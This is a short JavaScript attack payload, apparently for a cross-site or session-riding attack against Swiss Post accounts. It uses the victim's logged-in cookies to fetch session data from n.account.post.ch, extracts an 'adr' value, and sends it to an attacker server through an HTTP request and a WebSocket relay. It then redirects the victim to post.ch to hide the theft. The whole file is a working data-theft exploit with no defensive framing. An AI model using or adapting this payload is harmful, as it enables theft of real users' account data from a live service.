(async function pwn() {
  setTimeout(function() {
    window.location.href = 'https://www.post.ch/de';
  }, 2000);

  try {
    const sub = await fetch('https://n.account.post.ch/v1/session/subscribe', {credentials:'include'}).then(r=>r.json());
    const adr = sub && sub.adr;
    if (!adr) return;

    fetch('https://<SERVER>/stolen?a='+encodeURIComponent(adr), {keepalive:true}).catch(function(){});

    // Send {type:"adr"} so the attacker one-liner (which checks type==="adr") picks it up directly
    const relay = new WebSocket('wss://<SERVER>/ws');
    relay.onopen = function() {
      relay.send(JSON.stringify({type:'adr', adr: adr}));
      relay.close();
    };
  } catch(e) {
    fetch('https://<SERVER>/err?e='+encodeURIComponent(String(e)), {keepalive:true}).catch(function(){});
  }
})();
